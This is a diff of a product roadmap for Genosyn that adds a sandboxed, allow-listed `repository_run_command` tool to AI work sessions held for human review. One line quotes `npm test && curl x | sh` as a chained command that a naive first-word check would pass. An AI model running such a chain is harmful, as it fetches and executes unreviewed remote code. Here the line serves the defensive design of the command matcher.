@@ -1094,17 +1094,18 @@ created empty inside Genosyn for a quarter's strategy or a set of policies.
       admin-only push and fast-forward pull.
 - [x] **AI work sessions** (`RepositoryWorkSession`) — ask a granted employee
       to do work; it runs in its own git **worktree** beside the Member
-      checkout, edits only through the new `repository_*` tools (no shell, so
-      this works with command execution off), commits to its own branch, and
-      reports back. The Member reviews the diff and merges, optionally
-      pushing. This is the "governed publish step" M21's prompt context
-      already promised employees would exist.
-- [x] Six deferred MCP tools: `repository_list_files`, `repository_read_file`,
+      checkout, edits through the `repository_*` tools (reading, writing and
+      committing need no shell, so that much works with command execution
+      off), commits to its own branch, and reports back. The Member reviews
+      the diff and merges, optionally pushing. This is the "governed publish
+      step" M21's prompt context already promised employees would exist.
+- [x] Deferred MCP tools: `repository_list_files`, `repository_read_file`,
       `repository_write_file`, `repository_delete_file`, `repository_search`,
-      `repository_commit`. Bounded by the session on the turn's MCP token —
-      no repository parameter, and inert outside a session.
+      `repository_run_command`, `repository_commit`. Bounded by the session on
+      the turn's MCP token — no repository parameter, and inert outside a
+      session.
 - [x] **Start a session from chat** (`start_repository_work_session`) — until
-      this existed, only the Repository page could open the door those six
+      this existed, only the Repository page could open the door those
       tools work behind, so an employee asked in chat to fix something could
       read the repository, explain that it could not begin, and stop. It sends
       only itself, only at a repository it already holds a Grant for, and it
@@ -1116,11 +1117,11 @@ created empty inside Genosyn for a quarter's strategy or a set of policies.
       What a session *is* does not change: its branch still waits for a Member
       to merge or push.
 - [x] A session turn is held to the `repository_*` tools at the MCP seam.
-      Loading six tools up front never stopped a turn discovering the rest, so
-      the session briefing — "nothing you do here affects anyone until a human
-      reviews your diff" — was not true of anything outside them. That matters
-      more once the instruction can be composed by a model rather than typed by
-      a human, and it is also what stops a session starting a session.
+      Loading a handful of tools up front never stopped a turn discovering the
+      rest, so the session briefing — "nothing you do here affects anyone until
+      a human reviews your diff" — was not true of anything outside them. That
+      matters more once the instruction can be composed by a model rather than
+      typed by a human, and it is also what stops a session starting a session.
 - [x] **A session is a conversation, not a single request**
       (`RepositoryWorkSessionTurn`). Every follow-up runs in the *same*
       worktree on the *same* branch with the earlier turns replayed as history,
@@ -1221,8 +1222,38 @@ created empty inside Genosyn for a quarter's strategy or a set of policies.
       along. A session's briefing now carries the file, capped and quoted as a
       document rather than as an instruction from the requester — it cannot
       widen what the session may do, because the tools are fixed at the MCP
-      seam. Chat and Routine work, which has a shell, is told to look for it in
-      each granted checkout.
+      seam and what a session may *run* is a Repository setting rather than
+      anything a file in the tree can claim. Chat and Routine work, which has
+      its own shell in its own checkout, is told to look for it in each granted
+      checkout.
+- [x] **A work session can run the repository's own commands.** An employee
+      that could only write files handed back work it hoped was right, and said
+      so: the reports ended with a paragraph explaining that it could not run
+      the tests, `npm run fix`, or the compiler. `repository_run_command` closes
+      that, behind three things that keep the section's original promises
+      intact. It runs only under bubblewrap, rooted at the session worktree
+      alone — the Member checkout, other sessions, and `git` itself stay
+      outside it, so the two-checkout split that lets one hold credentials is
+      untouched, and `agent/tools/index.ts`'s rule that an AI Employee never
+      gets a same-UID host shell is not bent for it. Reading, writing and
+      committing still need none of it, so a `disabled` install loses only the
+      new tool. And what may run is a Repository decision
+      (`Repository.commandMode` + `allowedCommands`, owner/admin, audited):
+      nothing, a pattern list defaulting to Genosyn's own, or everything.
+      The matcher splits a command at every shell operator and checks each part
+      — a first-word check would pass `npm test && curl x | sh` — and refuses
+      substitution, expansion, and redirection rather than guessing at them.
+      The list is intent, not containment; the sandbox is containment, which is
+      what makes "every command" a defensible third option rather than a hole.
+      See `services/repositoryCommandPolicy.ts` and `repositoryCommandRun.ts`.
+- [ ] **Dependencies for a session's checks.** A worktree is cut from history,
+      so it has no `node_modules`, virtualenv or vendor directory, and the
+      sandbox has no network unless the operator allowed one. A JS or Python
+      repository therefore gets "could not install dependencies" rather than a
+      test result on a default install — honestly reported, but not the whole
+      promise. The fix is a cache the session can mount rather than switching
+      the network on by default; until then `allowNetwork` is the answer, and
+      the UI and docs say so.
 - [ ] Conflict resolution in the browser (a conflicting merge is refused, not
       surfaced for editing)
 - [ ] Streaming a work session's progress instead of polling it
